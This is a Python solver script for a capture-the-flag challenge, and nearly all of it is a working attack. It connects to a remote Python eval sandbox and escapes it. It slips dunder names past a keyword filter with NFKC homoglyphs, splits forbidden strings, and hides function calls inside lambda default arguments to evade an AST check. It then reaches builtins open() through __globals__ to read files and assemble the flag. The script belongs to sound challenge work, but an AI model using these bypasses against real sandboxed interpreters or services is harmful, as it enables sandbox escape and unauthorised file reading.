#!/usr/bin/env python3
import re
import socket
import sys
import unicodedata

HOST = sys.argv[1] if len(sys.argv) > 1 else "127.0.0.1"
PORT = int(sys.argv[2]) if len(sys.argv) > 2 else 1342


_ANSI = re.compile(r"\x1b\[[0-9;]*m")


def _clean(b):
    return _ANSI.sub("", b.decode("utf-8", "replace"))


_HOMO = {
    "a": "ᵃ", "b": "ᵇ", "c": "ᶜ", "d": "ᵈ", "e": "ᵉ",
    "g": "ᵍ", "i": "ᵢ", "l": "ˡ", "n": "ⁿ", "o": "ᵒ",
    "p": "ᵖ", "r": "ʳ", "s": "ˢ", "t": "ᵗ", "u": "ᵘ",
    "v": "ᵛ",
}


def smuggle(name):
    for i, ch in enumerate(name):
        if ch in _HOMO:
            out = name[:i] + _HOMO[ch] + name[i + 1:]
            assert unicodedata.normalize("NFKC", out) == name
            assert name not in out
            return out
    raise ValueError(name)


def split_str(s):
    mid = max(1, len(s) // 2)
    return "'%s'+'%s'" % (s[:mid], s[mid:])


class Cage:
    def __init__(self, host, port):
        self.s = socket.create_connection((host, port), timeout=10)
        self.s.settimeout(10)
        self.buf = b""
        self.evals = 0
        self._recv_prompt()
        self._send("\n")
        self._recv_prompt()


    def _recv_prompt(self):
        while True:
            text = _clean(self.buf)
            if text.endswith("› ") or text.endswith("> "):
                break
            chunk = self.s.recv(8192)
            if not chunk:
                break
            self.buf += chunk
        text = _clean(self.buf)
        self.buf = b""
        return text

    def _send(self, s):
        self.s.sendall(s.encode("utf-8"))

    def say(self, expr):
        self.evals += 1
        self._send("SAY " + expr + "\n")
        text = self._recv_prompt()

        lines = [ln for ln in text.replace("\r", "").split("\n")]

        resp = ""
        for ln in lines:
            t = ln.strip().strip("›").strip()
            if t:
                resp = t
        return resp

    def close(self):
        try:
            self._send("QUIT\n")
            self.s.close()
        except OSError:
            pass


def is_reject(r):
    return r.startswith("the mockingbird")


_TTY = sys.stdout.isatty()
def _c(code, s):
    return "\x1b[%sm%s\x1b[0m" % (code, s) if _TTY else s

def stage(n, title):
    print()
    print(_c("1;95", "=" * 72))
    print(_c("1;95", " STAGE %s  %s" % (n, title)))
    print(_c("1;95", "=" * 72))

def note(msg):
    print(_c("90", "    # " + msg))

def _short(s, n=110):
    return s if len(s) <= n else s[:n - 3] + "..."

def show(c, expr, why=None):
    if why:
        note(why)
    r = c.say(expr)
    if "will not sing it whole" in r:
        tag = _c("93", "WITHHELD")
    elif is_reject(r):
        tag = _c("91", "REJECT  ")
    else:
        tag = _c("92", "VALUE   ")
    print("    %s %s" % (_c("96", "SAY #%-2d" % c.evals), _short(expr)))
    print("    %s %s" % (tag, _short(r)))
    return r


def main():
    print(_c("1", "[*] mockingbird solver -> %s:%d" % (HOST, PORT)))
    c = Cage(HOST, PORT)
    print("[*] connected; skipped keeper token; session budget is 40 SAYs")


    stage(1, "recon -- sort the bird's reactions into categories")
    r = show(c, "1+1", "plain arithmetic: does it evaluate at all?")
    assert r == "2", "expected value category"
    r = show(c, "__class__", "a dunder name: refused before parsing? (lexical gate)")
    assert is_reject(r), "expected lexical reject"
    r = show(c, "(1).__add__(1)", "harmless names, but a Call: refused after parsing? (AST gate)")
    assert is_reject(r), "expected structural reject"
    note("two distinct refusal texts => two independent gates (letters vs shape)")


    stage(2, "lexical bypass -- NFKC homoglyph identifiers (PEP 3131)")
    DCT = smuggle("__dict__")
    GLOB = smuggle("__globals__")
    DEF = smuggle("__defaults__")
    B = split_str("__builtins__")
    O = split_str("open")
    for real, sm in (("__dict__", DCT), ("__globals__", GLOB), ("__defaults__", DEF)):
        odd = [ch for ch in sm if ord(ch) > 127][0]
        print("    %-14s -> %-14s (U+%04X %s folds to %r)" % (
            real, sm, ord(odd), unicodedata.name(odd), unicodedata.normalize("NFKC", odd)))
    note("string literals are NOT normalized, so denied strings are split instead:")
    print("    %-14s -> %s" % ("'__builtins__'", B))
    print("    %-14s -> %s" % ("'open'", O))

    d = show(c, "perch." + DCT, "read the tame object's attributes through the smuggled __dict__")
    assert d.startswith("{"), ("introspection failed", d)
    funcs = re.findall(r"'([a-z][a-z0-9]{2})': <function", d)
    paths = re.findall(r"'([a-z][a-z0-9]{2})': '(/[^']+)'", d)
    assert len(funcs) >= 2 and len(paths) >= 2, (funcs, paths)
    print("    functions on perch : %s" % ", ".join(funcs))
    for attr, p in paths:
        print("    path   perch.%-4s : %s" % (attr, p))
    note("names are randomized per connection -- they must be re-read every session")


    stage(3, "AST gap -- a Call inside a lambda DEFAULT is never inspected")

    def gcall(fattr, path_expr, sl=""):


        inner = "perch.%s.%s[%s][%s](%s).read()%s" % (fattr, GLOB, B, O, path_expr, sl)
        return "(lambda _=%s: _).%s[0]" % (inner, DEF)

    print("    template: (lambda _=<CALL>: _).%s[0]" % DEF)
    note("defaults are evaluated when the lambda is built, but visit_Lambda skips them")
    note("<CALL> = perch.<fn>.__globals__['__builtins__']['open'](<path>).read()")


    stage(4, "gadget hunt -- which function's __globals__ reach real I/O?")
    gadget = None
    probe_path = "perch." + paths[0][0]
    outputs = {}
    for f in funcs:
        r = show(c, gcall(f, probe_path), "try perch.%s as the carrier, reading %s" % (f, probe_path))
        outputs[f] = r
        if not is_reject(r) and "OVERPASS{" not in r and "will not sing" not in r:
            gadget = f
            first_val = r.strip("'")
            break
        note("perch.%s: no usable fragment -> decoy (fake open, same text for any path)" % f)
    assert gadget is not None, "no gadget reached I/O (all decoys?)"
    print("    %s perch.%s carries the real builtins -> real open()" % (_c("92", "[+]"), gadget))


    stage(5, "exfil -- two non-flag-shaped fragments, joined client-side")
    frags = {paths[0][0]: first_val}
    print("    fragment from perch.%s : %r" % (paths[0][0], first_val))
    for attr, _ in paths[1:]:
        r = show(c, gcall(gadget, "perch." + attr), "second retrieval: perch.%s" % attr)
        assert not is_reject(r), ("retrieval failed", attr, r)
        frags[attr] = r.strip("'")
        print("    fragment from perch.%s : %r" % (attr, frags[attr]))

    ordered = sorted(paths, key=lambda kv: kv[1].rsplit("/", 1)[-1])
    note("order by file name (a_* before b_*): " +
         " + ".join("perch." + a for a, _ in ordered))
    body = "".join(frags[attr] for attr, _ in ordered)
    flag = "OVERPASS{" + body + "}"


    cage_dir = paths[0][1].rsplit("/", 2)[0] + "/cage/notice.txt"
    show(c, gcall(gadget, split_str(cage_dir)),
         "filter check: a whole OVERPASS{...}-shaped read is withheld, not leaked")

    print()
    print(_c("1;95", "=" * 72))
    print("[*] evaluations used : %d / 40" % c.evals)
    print(_c("1;92", "[+] FLAG: " + flag))
    c.close()
    return flag


if __name__ == "__main__":
    main()
